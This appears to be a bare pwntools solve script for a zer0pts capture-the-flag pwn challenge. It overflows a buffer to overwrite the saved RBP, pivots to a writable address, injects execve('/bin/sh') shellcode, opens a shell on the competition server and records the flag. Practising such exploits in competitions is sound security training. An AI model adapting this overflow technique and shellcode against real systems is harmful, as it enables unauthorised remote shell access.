from pwn import *

stack = 0x600234
addr = stack + 0x20
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# p = process('./chall')
# p = remote('localhost', 7777)
p = remote('pwn.ctf.zer0pts.com', 9011)
e = ELF('./chall')

payload = b'A'*0x100
payload += p64(stack + 0x100)

p.recvuntil('Data: ')
p.sendline(payload)
p.recvuntil('Data: ')
p.sendline(p64(addr) + p64(e.symbols.notvuln))

payload = b'A'*0x100
payload += p64(addr + 0x100)

p.recvuntil('Data: ')
p.sendline(payload)
p.recvuntil('Data: ')
p.sendline(shellcode)

p.interactive()

# zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}